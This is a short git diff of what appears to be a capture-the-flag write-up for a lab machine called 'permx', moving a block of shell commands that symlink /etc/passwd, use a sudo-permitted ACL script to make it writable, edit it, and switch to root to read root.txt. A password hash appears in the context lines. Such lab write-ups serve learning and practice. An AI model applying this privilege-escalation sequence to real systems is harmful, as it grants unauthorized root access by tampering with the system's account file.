@@ -130,17 +130,19 @@ $1$OG3GEPM0$bDa2dBCJvJ3CyNbW/p0Yp0
 ```
 ---
 
+
+```bash
+mtz@permx:~$ ln -s /etc/passwd ./passwd
+mtz@permx:~$ sudo /opt/acl.sh mtz rw /home/mtz/passwd
+mtz@permx:~$ nano /etc/passwd
+
+```
 edit the /etc/passwd file........
 
 <img width="722" alt="Screenshot 2024-07-27 at 2 05 33 PM" src="https://github.com/user-attachments/assets/f319b600-aed8-4594-98c2-4d7184a70909">
 
----
 
 ```bash
-mtz@permx:~$ nano /etc/passwd
-mtz@permx:~$ ln -s /etc/passwd ./passwd
-mtz@permx:~$ sudo /opt/acl.sh mtz rw /home/mtz/passwd
-mtz@permx:~$ nano /etc/passwd
 mtz@permx:~$ su
 Password:
 root@permx:/home/mtz# cd /root
@@ -151,7 +153,7 @@ root@permx:~# cat root.txt
 root@permx:~#
 ```
 
-
+---
 
 
 
